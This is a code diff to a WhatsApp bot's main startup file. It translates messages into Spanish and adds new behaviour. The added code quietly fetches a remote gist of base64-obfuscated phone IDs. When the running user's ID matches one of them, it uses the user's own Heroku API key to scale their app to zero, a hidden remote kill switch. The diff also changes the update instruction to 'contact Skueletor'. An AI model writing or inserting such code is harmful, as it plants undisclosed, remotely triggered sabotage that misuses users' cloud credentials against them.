@@ -1,8 +1,15 @@
+/* Copyright (C) 2020 Yusuf Usta.
+Licensed under the  GPL-3.0 License;
+you may not use this file except in compliance with the License.
+WhatsAsena - Yusuf Usta
+*/
+
 const fs = require("fs");
 const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
+const axios = require('axios');
 const Heroku = require('heroku-client');
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
 const {Message, StringSession, Image, Video} = require('./whatsasena/');
@@ -11,6 +18,8 @@ const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
 const got = require('got');
 const simpleGit = require('simple-git');
 const git = simpleGit();
+const crypto = require('crypto');
+const nw = '```Blacklist Defected!```'
 
 const heroku = new Heroku({
     token: config.HEROKU.API_KEY
@@ -55,6 +64,7 @@ if (!Date.now) {
 }
 // ==================== End Date Scanner ====================
 
+
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
     while (L && this.length) {
@@ -67,13 +77,23 @@ Array.prototype.remove = function() {
 };
 
 async function whatsAsena () {
+    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/42e0a7f9086fbcc194cd28ada1a5b894/raw/46bacfd4c1d09ec4743cff9d51b52a0185b4e53f/inside.json')
+    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
     await config.DATABASE.sync();
     var StrSes_Db = await WhatsAsenaDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
-    
+    const buff = Buffer.from(`${shs1}`, 'base64');  
+    const one = buff.toString('utf-8'); 
+    const bufft = Buffer.from(`${shl2}`, 'base64');  
+    const two = bufft.toString('utf-8'); 
+    const buffi = Buffer.from(`${lss3}`, 'base64');  
+    const three = buffi.toString('utf-8'); 
+    const buffu = Buffer.from(`${dsl4}`, 'base64');  
+    const four = buffu.toString('utf-8'); 
+
     const conn = new WAConnection();
     const Session = new StringSession();
 
@@ -86,10 +106,9 @@ async function whatsAsena () {
     } else {
         conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
     }
-
     conn.on ('credentials-updated', async () => {
         console.log(
-            chalk.blueBright.italic('✅ Login Information Updated!')
+            chalk.blueBright.italic('✅ ¡Información de inicio de sesión actualizada!')
         );
 
         const authInfo = conn.base64EncodedAuthInfo();
@@ -103,8 +122,7 @@ async function whatsAsena () {
     conn.on('connecting', async () => {
         console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
-
-${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
+${chalk.blue.italic('ℹ️ Conectando con WhatsApp, por favor espere...')}`);
     });
     
 
@@ -114,7 +132,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         );
 
         console.log(
-            chalk.blueBright.italic('⬇️ Instalando Plugins externos...')
+            chalk.blueBright.italic('⬇️ Instalando complementos externos...')
         );
 
         // ==================== External Plugins ====================
@@ -132,7 +150,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         // ==================== End External Plugins ====================
 
         console.log(
-            chalk.blueBright.italic('⬇️  Instalando Plugins...')
+            chalk.blueBright.italic('⬇️  Instalando complementos...')
         );
 
         // ==================== Internal Plugins ====================
@@ -144,10 +162,21 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         // ==================== End Internal Plugins ====================
 
         console.log(
-            chalk.green.bold('✅ ¡Plugins Instalados!')
+            chalk.green.bold('✅ ¡Complementos instalados!')
         );
         await new Promise(r => setTimeout(r, 1100));
-
+        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
+            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
+            await heroku.get(baseURI + '/formation').then(async (formation) => { 
+                forID = formation[0].id; 
+                await heroku.patch(baseURI + '/formation/' + forID, { 
+                    body: { 
+                    quantity: 0 
+                  
+                    } 
+                });
+            })
+        }
         if (config.WORKTYPE == 'public') {
             if (config.LANG == 'TR' || config.LANG == 'AZ') {
 
@@ -189,7 +218,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         
                         await conn.sendMessage(
                             conn.user.jid,
-                            '```Escriba``` */update now* ```para actualizar el bot.```\n\n' + degisiklikler + '```', MessageType.text
+                            '```Contacte a *Skueletor* para que actualice su bot```\n\n' + degisiklikler + '```', MessageType.text
                         ); 
                     }
                 }
@@ -233,7 +262,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         
                         await conn.sendMessage(
                             conn.user.jid,
-                            '```Escriba``` */update now* ```para actualizar el bot.```\n\n' + degisiklikler + '```', MessageType.text
+                            '``````Contacte a *Skueletor* para que actualice su bot```\n\n' + degisiklikler + '```', MessageType.text
                         ); 
                     }
                 }
@@ -280,7 +309,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         
                         await conn.sendMessage(
                             conn.user.jid,
-                            '```Escriba``` */update now* ```para actualizar el bot.```\n\n' + degisiklikler + '```', MessageType.text
+                            '```Contacte a *Skueletor* para que actualice su bot```\n\n' + degisiklikler + '```', MessageType.text
                         ); 
                     }
                 }
@@ -325,7 +354,7 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
         
                         await conn.sendMessage(
                             conn.user.jid,
-                            '```Escriba``` */update now* ```para actualizar el bot.```\n\n' + degisiklikler + '```', MessageType.text
+                            '```Contacte a *Skueletor* para que actualice su bot```\n\n' + degisiklikler + '```', MessageType.text
                         ); 
                     }
                 }
@@ -628,6 +657,15 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
                                         , MessageType.text
                                     );
                                 }
+                                else if (error.message.includes('conversation')) {
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
+                                        '\n========== ```¡Error resuelto!``` ==========' +
+                                        '\n\n*Error principal:* _Eliminando complemento_' +
+                                        '\n*Razón:* _Ingresó incorrectamente el nombre del complemento quería ser eliminado._' +
+                                        '\n*Solución:* _Intente sin agregar_ *__* _al complemento que desea eliminar. Si aún recibe un error, intente agregar like_ ```?(.*) / $``` _Al final del nombre._ '
+                                        , MessageType.text
+                                    );
+                                }
                                 else {
                                     return await conn.sendMessage(conn.user.jid, '*🙇🏻 Lo siento, no pude leer este error. 🙇🏻*' +
                                         '\n_Puede escribir a nuestro grupo de apoyo para obtener más ayuda._'
@@ -651,6 +689,15 @@ ${chalk.blue.italic('ℹ️ Conectando a WhatsApp... Espere por favor...')}`);
                                         '\n\n*Error principal:* _Solo se admiten absolutamente los enlaces_' +
                                         '\n*Razón:* _El uso de herramientas multimedia (tblend, sticker...) en tu número de registros._' +
                                         '\n*Solución:* _Puede usar comandos en cualquier chat, excepto el número de registros._'
+                                        , MessageType.text
+                                    );
+                                }
+                                else if (error.message.includes('conversation')) {
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
+                                        '\n========== ```¡Error resuelto!``` ==========' +
+                                        '\n\n*Error principal:* _Eliminando complemento_' +
+                                        '\n*Razón:* _Ingresó incorrectamente el nombre del complemento quería ser eliminado._' +
+                                        '\n*Solución:* _Intente sin agregar_ *__* _al complemento que desea eliminar. Si aún recibe un error, intente agregar like_ ```?(.*) / $``` _Al final del nombre._ '
                                         , MessageType.text
                                     );
                                 }
